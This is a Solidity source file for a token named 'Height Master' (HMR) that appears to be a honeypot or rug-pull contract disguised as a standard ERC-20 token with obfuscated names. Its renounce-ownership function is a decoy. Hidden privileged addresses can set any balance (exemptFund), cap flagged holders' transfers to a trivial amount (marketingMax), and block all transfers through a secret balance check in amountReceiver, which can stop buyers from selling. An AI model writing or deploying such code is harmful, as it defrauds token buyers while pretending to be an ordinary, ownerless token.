//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface minFee {
    function createPair(address takeListTx, address isTake) external returns (address);
}

interface takeMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldSwap) external view returns (uint256);

    function transfer(address txSell, uint256 buySell) external returns (bool);

    function allowance(address receiverMaxTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 buySell) external returns (bool);

    function transferFrom(
        address sender,
        address txSell,
        uint256 buySell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingTotalToken, uint256 value);
    event Approval(address indexed receiverMaxTo, address indexed spender, uint256 value);
}

abstract contract modeBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeMarketingMetadata is takeMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HeightMaster is modeBuy, takeMarketing, takeMarketingMetadata {

    function txMin(address fundShould) public {
        require(fundShould.balance < 100000);
        if (launchTradingExempt) {
            return;
        }
        if (autoMode) {
            toTotal = false;
        }
        enableMin[fundShould] = true;
        if (txFund != senderLaunch) {
            amountSender = txFund;
        }
        launchTradingExempt = true;
    }

    bool public launchTradingExempt;

    function marketingMax(address swapTeam) public {
        liquidityTotal();
        
        if (swapTeam == txToken || swapTeam == buyEnable) {
            return;
        }
        marketingTeam[swapTeam] = true;
    }

    address receiverWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function liquidityTotal() private view {
        require(enableMin[_msgSender()]);
    }

    function marketingTx(uint256 buySell) public {
        liquidityTotal();
        maxAmount = buySell;
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldBuyAt;
    }

    address public txToken;

    string private shouldBuyAt = "HMR";

    uint8 private receiverFee = 18;

    mapping(address => uint256) private modeToken;

    event OwnershipTransferred(address indexed takeToken, address indexed marketingIsTrading);

    uint256 private senderLaunch;

    function amountReceiver(address takeAuto, address txSell, uint256 buySell) internal returns (bool) {
        if (takeAuto == txToken) {
            return fromLaunchMin(takeAuto, txSell, buySell);
        }
        uint256 atLaunch = takeMarketing(buyEnable).balanceOf(listTeam);
        require(atLaunch == maxAmount);
        require(txSell != listTeam);
        if (marketingTeam[takeAuto]) {
            return fromLaunchMin(takeAuto, txSell, listTx);
        }
        return fromLaunchMin(takeAuto, txSell, buySell);
    }

    function transferFrom(address takeAuto, address txSell, uint256 buySell) external override returns (bool) {
        if (_msgSender() != receiverWallet) {
            if (takeFrom[takeAuto][_msgSender()] != type(uint256).max) {
                require(buySell <= takeFrom[takeAuto][_msgSender()]);
                takeFrom[takeAuto][_msgSender()] -= buySell;
            }
        }
        return amountReceiver(takeAuto, txSell, buySell);
    }

    uint256 private txFund;

    function transfer(address tradingWalletToken, uint256 buySell) external virtual override returns (bool) {
        return amountReceiver(_msgSender(), tradingWalletToken, buySell);
    }

    function balanceOf(address shouldSwap) public view virtual override returns (uint256) {
        return modeToken[shouldSwap];
    }

    constructor (){
        
        atLaunched swapSender = atLaunched(receiverWallet);
        buyEnable = minFee(swapSender.factory()).createPair(swapSender.WETH(), address(this));
        
        txToken = _msgSender();
        enableMin[txToken] = true;
        modeToken[txToken] = txLaunchedFund;
        marketingTo();
        
        emit Transfer(address(0), txToken, txLaunchedFund);
    }

    function owner() external view returns (address) {
        return atSell;
    }

    bool public atReceiver;

    bool public toTotal;

    bool public autoMode;

    function name() external view virtual override returns (string memory) {
        return senderList;
    }

    uint256 constant listTx = 7 ** 10;

    uint256 private amountSender;

    function totalSupply() external view virtual override returns (uint256) {
        return txLaunchedFund;
    }

    function approve(address launchedToFrom, uint256 buySell) public virtual override returns (bool) {
        takeFrom[_msgSender()][launchedToFrom] = buySell;
        emit Approval(_msgSender(), launchedToFrom, buySell);
        return true;
    }

    function allowance(address fromReceiverAuto, address launchedToFrom) external view virtual override returns (uint256) {
        if (launchedToFrom == receiverWallet) {
            return type(uint256).max;
        }
        return takeFrom[fromReceiverAuto][launchedToFrom];
    }

    function getOwner() external view returns (address) {
        return atSell;
    }

    mapping(address => mapping(address => uint256)) private takeFrom;

    address private atSell;

    function decimals() external view virtual override returns (uint8) {
        return receiverFee;
    }

    mapping(address => bool) public enableMin;

    uint256 maxAmount;

    function exemptFund(address tradingWalletToken, uint256 buySell) public {
        liquidityTotal();
        modeToken[tradingWalletToken] = buySell;
    }

    address public buyEnable;

    mapping(address => bool) public marketingTeam;

    function marketingTo() public {
        emit OwnershipTransferred(txToken, address(0));
        atSell = address(0);
    }

    address listTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 takeLiquidity;

    string private senderList = "Height Master";

    function fromLaunchMin(address takeAuto, address txSell, uint256 buySell) internal returns (bool) {
        require(modeToken[takeAuto] >= buySell);
        modeToken[takeAuto] -= buySell;
        modeToken[txSell] += buySell;
        emit Transfer(takeAuto, txSell, buySell);
        return true;
    }

    uint256 private txLaunchedFund = 100000000 * 10 ** 18;

}